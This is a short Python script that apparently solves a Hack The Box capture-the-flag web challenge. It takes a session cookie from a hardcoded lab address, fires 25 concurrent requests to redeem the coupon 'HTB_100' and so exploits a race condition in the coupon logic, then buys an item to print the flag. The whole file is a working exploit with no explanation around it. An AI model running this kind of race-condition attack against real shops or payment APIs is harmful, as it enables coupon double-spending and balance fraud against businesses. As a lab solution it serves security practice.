import asyncio
import httpx
import requests

BASE = "http://46.101.72.211:30835"
async def use_code(client, session_cookie):
    resp = await client.post(f'{BASE}/api/coupons/apply', cookies={"session": f"{session_cookie}"}, data={"coupon_code": "HTB_100"})
    return resp.text

async def main():
    while True:
      balance = 0
      async with httpx.AsyncClient() as client:
          r_first = requests.post(f'{BASE}/api/purchase', data={"item": "C8"})
          session_cookie = r_first.cookies["session"]
          print(session_cookie)
          tasks = []
          for _ in range(25): #20 times
              tasks.append(asyncio.ensure_future(use_code(client,session_cookie)))
          
          # Get responses
          results = await asyncio.gather(*tasks, return_exceptions=True)
          
          # Print results
          for r in results:
              if "$1 coupon redeemed successfully!" in r:
                balance += 1
      print(f'balance:{balance}')
      if balance >= 14:
        print("Done!")
        flag = requests.post(f'{BASE}/api/purchase', data={"item": "C8"}, cookies={"session": f"{session_cookie}"})
        print(flag.text)
        break

asyncio.run(main())